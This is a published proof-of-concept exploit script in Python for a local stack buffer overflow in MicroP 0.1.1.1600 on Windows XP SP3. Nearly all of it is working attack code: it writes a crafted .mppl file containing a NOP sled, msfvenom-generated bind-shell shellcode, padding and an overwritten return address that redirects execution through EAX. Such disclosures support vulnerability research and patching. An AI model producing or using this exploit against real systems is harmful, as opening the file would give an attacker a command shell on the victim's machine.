"""
Full title:	MicroP 0.1.1.1600 Local Stack Buffer Overflow
Exploit Author:	Paolo Stagno - voidsec@voidsec.com - https://voidsec.com
Vendor Homepage:	http://sourceforge.net/projects/microp/
Version:	MicroP 0.1.1.1600
Tested on:	Windows XP SP3
Category:	local exploit
Platform:	windows
"""

#!/usr/bin/python
# EAX is pointing to buffer instead of ESP
# Follow EAX in dump, go to location MEM addr + A (junk) offset (in hex)
# see where the pattern is corrupted
file=open("exploit.mppl","wb")

#badchar \x00\x0a\x0d
#msfvenom -p windows/shell_bind_tcp -f c -a x86 -b "\x00\x0a\x0d"
shellcode=("\xdb\xc4\xba\x79\x94\x98\xcc\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"
"\x53\x31\x56\x17\x83\xc6\x04\x03\x2f\x87\x7a\x39\x33\x4f\xf8"
"\xc2\xcb\x90\x9d\x4b\x2e\xa1\x9d\x28\x3b\x92\x2d\x3a\x69\x1f"
"\xc5\x6e\x99\x94\xab\xa6\xae\x1d\x01\x91\x81\x9e\x3a\xe1\x80"
"\x1c\x41\x36\x62\x1c\x8a\x4b\x63\x59\xf7\xa6\x31\x32\x73\x14"
"\xa5\x37\xc9\xa5\x4e\x0b\xdf\xad\xb3\xdc\xde\x9c\x62\x56\xb9"
"\x3e\x85\xbb\xb1\x76\x9d\xd8\xfc\xc1\x16\x2a\x8a\xd3\xfe\x62"
"\x73\x7f\x3f\x4b\x86\x81\x78\x6c\x79\xf4\x70\x8e\x04\x0f\x47"
"\xec\xd2\x9a\x53\x56\x90\x3d\xbf\x66\x75\xdb\x34\x64\x32\xaf"
"\x12\x69\xc5\x7c\x29\x95\x4e\x83\xfd\x1f\x14\xa0\xd9\x44\xce"
"\xc9\x78\x21\xa1\xf6\x9a\x8a\x1e\x53\xd1\x27\x4a\xee\xb8\x2f"
"\xbf\xc3\x42\xb0\xd7\x54\x31\x82\x78\xcf\xdd\xae\xf1\xc9\x1a"
"\xd0\x2b\xad\xb4\x2f\xd4\xce\x9d\xeb\x80\x9e\xb5\xda\xa8\x74"
"\x45\xe2\x7c\xe0\x4d\x45\x2f\x17\xb0\x35\x9f\x97\x1a\xde\xf5"
"\x17\x45\xfe\xf5\xfd\xee\x97\x0b\xfe\x01\x34\x85\x18\x4b\xd4"
"\xc3\xb3\xe3\x16\x30\x0c\x94\x69\x12\x24\x32\x21\x74\xf3\x3d"
"\xb2\x52\x53\xa9\x39\xb1\x67\xc8\x3d\x9c\xcf\x9d\xaa\x6a\x9e"
"\xec\x4b\x6a\x8b\x86\xe8\xf9\x50\x56\x66\xe2\xce\x01\x2f\xd4"
"\x06\xc7\xdd\x4f\xb1\xf5\x1f\x09\xfa\xbd\xfb\xea\x05\x3c\x89"
"\x57\x22\x2e\x57\x57\x6e\x1a\x07\x0e\x38\xf4\xe1\xf8\x8a\xae"
"\xbb\x57\x45\x26\x3d\x94\x56\x30\x42\xf1\x20\xdc\xf3\xac\x74"
"\xe3\x3c\x39\x71\x9c\x20\xd9\x7e\x77\xe1\xe9\x34\xd5\x40\x62"
"\x91\x8c\xd0\xef\x22\x7b\x16\x16\xa1\x89\xe7\xed\xb9\xf8\xe2"
"\xaa\x7d\x11\x9f\xa3\xeb\x15\x0c\xc3\x39")
#|NOP sled|shellcode|NOP padding|CALL EAX
buffer="\x90"*24
buffer+=shellcode
buffer+="\x90"*(1276-len(buffer))
buffer+="\x4D\xDB\x42\x00"# we should call eax/jmp eax instead of esp 0042DB4D
file.write(buffer)
file.close()